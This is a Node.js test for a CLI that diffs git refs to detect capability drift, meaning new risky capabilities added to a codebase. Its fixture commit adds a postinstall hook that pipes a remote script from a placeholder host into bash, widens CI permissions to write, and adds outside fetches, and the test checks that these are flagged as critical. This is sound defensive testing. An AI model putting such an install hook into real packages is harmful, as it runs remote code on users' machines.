import test from 'node:test';
import assert from 'node:assert/strict';
import { execFile } from 'node:child_process';
import { mkdtemp, writeFile, mkdir, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { promisify } from 'node:util';
import { fileURLToPath } from 'node:url';
import { dirname } from 'node:path';

const execFileAsync = promisify(execFile);
const testDir = dirname(fileURLToPath(import.meta.url));
const packageRoot = join(testDir, '..');

test('CLI diffs capability drift between git refs without agent config changes', async () => {
  const repo = await mkdtemp(join(tmpdir(), 'capabilityecho-git-'));
  try {
    await execGit(repo, 'init', '-b', 'main');
    await execGit(repo, 'config', 'user.name', 'CapabilityEcho Test');
    await execGit(repo, 'config', 'user.email', 'capabilityecho@example.invalid');

    await writeProject(repo, {
      packageJson: {
        name: 'git-fixture',
        private: true,
        scripts: { test: 'vitest' }
      },
      workflow: [
        'name: CI',
        '',
        'permissions:',
        '  contents: read',
        '',
        'jobs:',
        '  test:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm test'
      ].join('\n'),
      source: "export function hello() {\n  return 'ok';\n}\n"
    });
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'base app');
    const base = await gitStdout(repo, 'rev-parse', 'HEAD');

    await writeProject(repo, {
      packageJson: {
        name: 'git-fixture',
        private: true,
        scripts: {
          test: 'vitest',
          postinstall: 'curl https://install.example.com/setup.sh | bash'
        }
      },
      workflow: [
        'name: CI',
        '',
        'permissions:',
        '  contents: write',
        '',
        'jobs:',
        '  test:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm test',
        '      - run: curl https://example.com/bootstrap.sh'
      ].join('\n'),
      source: "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n"
    });
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'add capability drift');
    const head = await gitStdout(repo, 'rev-parse', 'HEAD');

    const { stdout } = await execFileAsync(
      process.execPath,
      ['dist/index.js', 'diff', '--repo', repo, '--base', base, '--head', head, '--format', 'json'],
      { cwd: packageRoot }
    );
    const report = JSON.parse(stdout);

    assert.equal(report.rating, 'critical');
    assert.ok(report.findings.some((finding) => finding.kind === 'external_fetch_added'));
    assert.ok(report.findings.some((finding) => finding.kind === 'workflow_permission_write'));
    assert.ok(report.findings.some((finding) => finding.kind === 'lifecycle_script_added'));
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

async function writeProject(repo, { packageJson, workflow, source }) {
  await mkdir(join(repo, 'src'), { recursive: true });
  await mkdir(join(repo, '.github', 'workflows'), { recursive: true });
  await writeFile(join(repo, 'package.json'), `${JSON.stringify(packageJson, null, 2)}\n`, 'utf8');
  await writeFile(join(repo, '.github/workflows/ci.yml'), `${workflow}\n`, 'utf8');
  await writeFile(join(repo, 'src/client.ts'), source, 'utf8');
}

async function execGit(cwd, ...args) {
  await execFileAsync('git', ['-C', cwd, ...args]);
}

async function gitStdout(cwd, ...args) {
  const { stdout } = await execFileAsync('git', ['-C', cwd, ...args], { encoding: 'utf8' });
  return stdout.trim();
}
